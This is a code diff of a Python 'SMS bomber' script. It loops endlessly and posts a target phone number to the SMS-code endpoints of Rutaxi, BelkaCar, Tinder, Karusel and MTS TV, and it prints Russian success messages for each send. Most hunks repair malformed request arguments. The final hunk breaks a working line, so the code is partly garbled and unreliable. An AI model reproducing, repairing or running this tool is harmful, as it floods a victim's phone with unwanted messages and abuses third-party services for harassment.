@@ -34,7 +34,7 @@ while True:
         _email = _name+f'{iteration}'+'@gmail.com'
         email = _name+f'{iteration}'+'@gmail.com'
         try: 
-            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'phone': '+'+_phone}, headers={}) 
             print("[+] Rutaxi вкинулся!") 
         except Exception as ex:  
             print("[-] Rutaxi откинулся!" + str(ex))
@@ -47,20 +47,20 @@ while True:
 
 
         try: 
-            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '+'+_phone}, headers={}) 
             print("[+] BelkaCar вкинулся!") 
         except Exception as ex:  
             print("[-] BelkaCar откинулся!" + str(ex))
 
         try: 
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': '+'+_phone}, headers={}) 
             print("[+] Тиндер вкинулся!") 
         except Exception as ex:  
             print("[-] Тиндер откинулся!" + str(ex))
 
 
         try: 
-            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, headers={}) 
             print("[+] Карусель вкинулся!") 
         except Exception as ex:  
             print("[-] Карусель откинулся!" + str(ex))
@@ -71,7 +71,7 @@ while True:
             s=s
 
         try:
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, ={})
         except:
             s=s
 
